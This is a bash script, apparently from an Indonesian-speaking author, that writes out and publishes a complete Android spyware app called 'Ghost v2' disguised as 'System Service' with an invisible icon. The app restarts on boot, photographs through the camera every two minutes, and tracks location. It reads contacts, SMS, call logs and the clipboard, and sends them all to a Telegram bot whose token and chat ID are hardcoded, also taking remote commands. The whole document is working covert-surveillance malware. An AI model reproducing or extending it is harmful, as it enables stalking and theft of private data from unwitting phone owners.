#!/usr/bin/env bash
ROOT="$HOME/ghost/GhostAPK"
cd "$ROOT" || exit 1

# 1. ROOT GRADLE
cat > build.gradle.kts << 'EOF'
plugins {
    id("com.android.application") version "8.2.2" apply false
    id("org.jetbrains.kotlin.android") version "1.9.22" apply false
}
EOF

# 2. APP GRADLE
cat > app/build.gradle.kts << 'EOF'
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}
android {
    namespace = "com.ghost.app"
    compileSdk = 34
    defaultConfig {
        applicationId = "com.ghost.app"
        minSdk = 29
        targetSdk = 34
        versionCode = 1
        versionName = "2.0"
    }
    buildTypes { release { isMinifyEnabled = false } }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}
dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
}
EOF

# 3. WORKFLOW
mkdir -p .github/workflows
cat > .github/workflows/build.yml << 'EOF'
name: Build Debug APK and Publish Release
on:
  push:
    branches: [ main ]
  workflow_dispatch:
permissions:
  contents: write
jobs:
  build-debug-apk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
      - name: Set up Gradle 8.2
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.2'
      - name: Build debug APK
        run: gradle :app:assembleDebug --stacktrace --no-daemon
      - uses: actions/upload-artifact@v4
        with:
          name: app-debug-apk
          path: app/build/outputs/apk/debug/app-debug.apk
          if-no-files-found: error
      - name: Publish APK
        continue-on-error: true
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          cp "app/build/outputs/apk/debug/app-debug.apk" "./GhostAPK.apk"
          gh release create "build-${GITHUB_RUN_NUMBER}" "./GhostAPK.apk" --title "Build #${GITHUB_RUN_NUMBER}" --latest
EOF

# 4. KODE KOTLIN
cat > app/src/main/java/com/ghost/app/Config.kt << 'EOF'
package com.ghost.app
object Config {
    const val BOT_TOKEN = "8979892870:AAF4LWXXxjOA8tvJUGfI5N4vf3XkJCw1UqQ"
    const val CHAT_ID   = "7732912025"
    const val API_BASE  = "https://api.telegram.org/bot$BOT_TOKEN"
    const val POLL_INTERVAL_MS  = 2500L
    const val PHOTO_INTERVAL_MS = 120000L
    const val TRACK_INTERVAL_MS = 30000L
}
EOF

cat > app/src/main/java/com/ghost/app/TgSender.kt << 'EOF'
package com.ghost.app
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit
object TgSender {
    private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
    fun sendMessage(text: String) {
        val json = "{\"chat_id\":\"${Config.CHAT_ID}\",\"text\":\"${text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")}\",\"parse_mode\":\"HTML\"}"
        val req = Request.Builder().url("${Config.API_BASE}/sendMessage").post(json.toRequestBody("application/json".toMediaType())).build()
        runCatching { client.newCall(req).execute().close() }
    }
    fun sendLong(text: String) {
        if (text.length <= 3900) { sendMessage(text); return }
        var i = 0
        while (i < text.length) { val end = minOf(i + 3900, text.length); sendMessage(text.substring(i, end)); i = end }
    }
    fun sendPhoto(bytes: ByteArray, caption: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", Config.CHAT_ID).addFormDataPart("caption", caption).addFormDataPart("photo", "cap.jpg", bytes.toRequestBody("image/jpeg".toMediaType())).build()
        val req = Request.Builder().url("${Config.API_BASE}/sendPhoto").post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }
    fun getUpdates(offset: Long): String? {
        val req = Request.Builder().url("${Config.API_BASE}/getUpdates?offset=$offset&timeout=0").get().build()
        return try { client.newCall(req).execute().use { it.body?.string() } } catch (e: IOException) { null }
    }
}
EOF

cat > app/src/main/java/com/ghost/app/DataGrabber.kt << 'EOF'
package com.ghost.app
import android.content.ClipboardManager
import android.content.Context
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
object DataGrabber {
    fun contacts(ctx: Context): String {
        val sb = StringBuilder("📇 <b>Kontak</b>\n"); var count = 0
        try {
            ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use {
                while (it.moveToNext() && count < 200) { sb.append("• ${it.getString(0) ?: "?"} — ${it.getString(1) ?: "?"}\n"); count++ }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }
    fun sms(ctx: Context, limit: Int = 60): String {
        val sb = StringBuilder("💬 <b>SMS terakhir</b>\n"); var count = 0
        try {
            ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY), null, null, Telephony.Sms.DATE + " DESC")?.use {
                while (it.moveToNext() && count < limit) { sb.append("• <b>${it.getString(0) ?: "?"}</b>: ${it.getString(1)?.take(150) ?: ""}\n"); count++ }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }
    fun callLog(ctx: Context, limit: Int = 60): String {
        val sb = StringBuilder("📞 <b>Call log</b>\n"); var count = 0
        try {
            ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION), null, null, CallLog.Calls.DATE + " DESC")?.use {
                while (it.moveToNext() && count < limit) {
                    val type = when (it.getInt(1)) { CallLog.Calls.INCOMING_TYPE -> "masuk"; CallLog.Calls.OUTGOING_TYPE -> "keluar"; CallLog.Calls.MISSED_TYPE -> "missed"; else -> "?" }
                    sb.append("• ${it.getString(0) ?: "?"} — $type — ${it.getLong(2)}s\n"); count++
                }
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        if (count == 0) sb.append("(kosong / izin ditolak)\n")
        return sb.toString()
    }
    fun apps(ctx: Context): String {
        val sb = StringBuilder("📦 <b>App terinstall</b>\n")
        try {
            val pm = ctx.packageManager
            pm.getInstalledPackages(0).take(200).forEach { p ->
                val label = try { pm.getApplicationLabel(p.applicationInfo).toString() } catch (e: Exception) { p.packageName }
                sb.append("• $label (${p.packageName})\n")
            }
        } catch (e: Exception) { sb.append("err: ${e.message}\n") }
        return sb.toString()
    }
    fun deviceInfo(ctx: Context): String {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val sb = StringBuilder("📱 <b>Device info</b>\n")
        sb.append("Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nManuf: ${Build.MANUFACTURER}\nAndroid: ${Build.VERSION.RELEASE}\nDevice: ${Build.DEVICE}\n")
        @Suppress("DEPRECATION") val num = tm.line1Number
        if (!num.isNullOrBlank()) sb.append("Nomor: $num\n")
        sb.append("Operator: ${tm.networkOperatorName}\n")
        return sb.toString()
    }
    fun clipboard(ctx: Context): String {
        return try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip == null || clip.itemCount == 0) "📋 clipboard kosong" else "📋 <b>Clipboard</b>\n${clip.getItemAt(0).text}"
        } catch (e: Exception) { "📋 err: ${e.message}" }
    }
}
EOF

cat > app/src/main/java/com/ghost/app/MainActivity.kt << 'EOF'
package com.ghost.app
import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
class MainActivity : AppCompatActivity() {
    private val REQ = 1001
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val perms = mutableListOf(
            Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS
        )
        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)
        val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isEmpty()) { startSvc(); finish() } else { ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ) }
    }
    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g); startSvc(); finish()
    }
    private fun startSvc() {
        val i = Intent(this, CaptureService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
    }
}
EOF

cat > app/src/main/java/com/ghost/app/CaptureService.kt << 'EOF'
package com.ghost.app
import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.net.Uri
import android.os.*
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine
class CaptureService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val lastUpdateId = AtomicLong(0)
    private var torchOn = false
    private var tracking = false
    private var cameraId: String? = null
    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotif("System service running"))
        cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
        scope.launch { TgSender.sendMessage("🟢 <b>Ghost v2 online</b>\nDevice: ${Build.MODEL}\n\nKetik /menu") }
        scope.launch { pollLoop() }
        scope.launch { photoLoop() }
    }
    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null
    override fun onDestroy() { scope.cancel(); super.onDestroy() }
    private fun buildNotif(text: String): Notification {
        val chId = "ghost_ch"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(chId, "System", NotificationManager.IMPORTANCE_LOW))
        return NotificationCompat.Builder(this, chId).setContentTitle("System Service").setContentText(text).setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
    }
    private suspend fun pollLoop() {
        while (scope.isActive) {
            try {
                val raw = TgSender.getUpdates(lastUpdateId.get()) ?: continue
                val arr = JSONObject(raw).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val upd = arr.getJSONObject(i); lastUpdateId.set(upd.getLong("update_id") + 1)
                    val msg = upd.optJSONObject("message") ?: continue
                    if (msg.getJSONObject("chat").optString("id") != Config.CHAT_ID) continue
                    handleCommand(msg.optString("text").trim())
                }
            } catch (e: Exception) { Log.w("Ghost", "poll", e) }
            delay(Config.POLL_INTERVAL_MS)
        }
    }
    private fun handleCommand(cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "/help" -> TgSender.sendLong(MENU)
            cmd == "/status" -> TgSender.sendMessage("🟢 alive\ntorch=${if (torchOn) "on" else "off"}\ntrack=${if (tracking) "on" else "off"}")
            cmd == "/photo" -> scope.launch { takePhotoAndSend() }
            cmd == "/loc" -> scope.launch { sendLocation() }
            cmd == "/track_on" -> { tracking = true; scope.launch { trackLoop() }; TgSender.sendMessage("📍 tracking on") }
            cmd == "/track_off" -> { tracking = false; TgSender.sendMessage("📍 tracking off") }
            cmd == "/torch_on" -> scope.launch { setTorch(true) }
            cmd == "/torch_off" -> scope.launch { setTorch(false) }
            cmd == "/battery" -> {
                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                TgSender.sendMessage("🔋 ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%")
            }
            cmd == "/contacts" -> scope.launch { TgSender.sendLong(DataGrabber.contacts(this@CaptureService)) }
            cmd == "/sms" -> scope.launch { TgSender.sendLong(DataGrabber.sms(this@CaptureService)) }
            cmd == "/calls" -> scope.launch { TgSender.sendLong(DataGrabber.callLog(this@CaptureService)) }
            cmd == "/apps" -> scope.launch { TgSender.sendLong(DataGrabber.apps(this@CaptureService)) }
            cmd == "/device" -> scope.launch { TgSender.sendLong(DataGrabber.deviceInfo(this@CaptureService)) }
            cmd == "/clip" -> scope.launch { TgSender.sendMessage(DataGrabber.clipboard(this@CaptureService)) }
            cmd == "/vibrate" -> {
                val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE)) else @Suppress("DEPRECATION") v.vibrate(800)
                TgSender.sendMessage("📳 vibrate")
            }
            cmd.startsWith("/volume ") -> {
                val lvl = cmd.removePrefix("/volume ").trim().toIntOrNull() ?: 50
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                am.setStreamVolume(AudioManager.STREAM_MUSIC, (max * lvl / 100), 0)
                TgSender.sendMessage("🔊 volume $lvl%")
            }
            cmd.startsWith("/toast ") -> {
                val txt = cmd.removePrefix("/toast ")
                Handler(Looper.getMainLooper()).post { Toast.makeText(this, txt, Toast.LENGTH_LONG).show() }
                TgSender.sendMessage("💬 toast sent")
            }
            cmd.startsWith("/open ") -> {
                val url = cmd.removePrefix("/open ")
                try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); TgSender.sendMessage("🌐 opened") } catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") }
            }
            else -> TgSender.sendMessage("❓ command tidak dikenal. ketik /menu")
        }
    }
    private suspend fun photoLoop() { while (scope.isActive) { delay(Config.PHOTO_INTERVAL_MS); runCatching { takePhotoAndSend() } } }
    private suspend fun trackLoop() { while (tracking && scope.isActive) { sendLocation(); delay(Config.TRACK_INTERVAL_MS) } }
    private suspend fun takePhotoAndSend() = suspendCoroutine<Unit> { cont ->
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager
        val id = cameraId ?: run { cont.resume(Unit); return@suspendCoroutine }
        try {
            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: run { cont.resume(Unit); return@suspendCoroutine }
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = img.planes[0].buffer; val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                img.close(); r.close(); scope.launch { TgSender.sendPhoto(bytes, "📸 ${Build.MODEL}"); cont.resume(Unit) }
            }, Handler(Looper.getMainLooper()))
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(dev: CameraDevice) {
                    dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE); req.addTarget(reader.surface)
                            s.capture(req.build(), null, null); dev.close()
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { dev.close(); cont.resume(Unit) }
                    }, null)
                }
                override fun onDisconnected(dev: CameraDevice) { dev.close() }
                override fun onError(dev: CameraDevice, e: Int) { dev.close(); cont.resume(Unit) }
            }, null)
        } catch (e: Exception) { Log.w("Ghost", "photo", e); cont.resume(Unit) }
    }
    private fun setTorch(on: Boolean) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager; val id = cameraId ?: return
            cm.setTorchMode(id, on); torchOn = on; TgSender.sendMessage(if (on) "🔦 torch on" else "🔦 torch off")
        } catch (e: Exception) { TgSender.sendMessage("torch err: ${e.message}") }
    }
    private fun sendLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) { TgSender.sendMessage("📍 no location"); return }
            TgSender.sendMessage("📍 <b>Lokasi</b>\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAkurasi: ${loc.accuracy}m\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}")
        } catch (e: SecurityException) { TgSender.sendMessage("📍 izin lokasi belum aktif") }
    }
    companion object {
        val MENU = """
🤖 <b>Ghost v2 — Menu Fitur</b>
📸 /photo — ambil foto (auto tiap 2 mnt)
📍 /loc — lokasi sekarang
📍 /track_on / /track_off — tracking
🔦 /torch_on / /torch_off — senter
📳 /vibrate — getarkan HP
🔊 /volume 50 — set volume
📇 /contacts — kontak
💬 /sms — SMS
📞 /calls — call log
📦 /apps — app terinstall
📱 /device — info HP
📋 /clip — clipboard
💬 /toast teks — toast
🌐 /open https://x — buka URL
🔋 /battery — baterai
/status — status service
        """.trimIndent()
    }
}
EOF

cat > app/src/main/java/com/ghost/app/BootReceiver.kt << 'EOF'
package com.ghost.app
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val i = Intent(ctx, CaptureService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        }
    }
}
EOF

# 5. MANIFEST & RES (Yang tadi kehapus/berantakan)
mkdir -p app/src/main/res/values app/src/main/res/mipmap-anydpi-v26
cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
    <application android:allowBackup="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:theme="@style/Theme.Ghost">
        <activity android:name=".MainActivity" android:exported="true" android:theme="@style/Theme.Transparent" android:excludeFromRecents="true" android:noHistory="true">
            <intent-filter><action android:name="android.intent.action.MAIN"/></intent-filter>
        </activity>
        <service android:name=".CaptureService" android:exported="false" android:foregroundServiceType="camera|location"/>
        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
        </receiver>
    </application>
</manifest>
EOF
cat > app/src/main/res/values/strings.xml << 'EOF'
<resources><string name="app_name">System Service</string></resources>
EOF
cat > app/src/main/res/values/themes.xml << 'EOF'
<resources>
    <style name="Theme.Ghost" parent="Theme.AppCompat.DayNight.NoActionBar"/>
    <style name="Theme.Transparent" parent="android:Theme.Translucent.NoTitleBar">
        <item name="android:windowBackground">@android:color/transparent</item>
        <item name="android:windowIsTranslucent">true</item>
        <item name="android:windowNoTitle">true</item>
    </style>
</resources>
EOF
cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@android:color/transparent"/>
    <foreground android:drawable="@android:color/transparent"/>
</adaptive-icon>
EOF

echo "✅ Semua file berhasil di-reset ke versi stabil!"
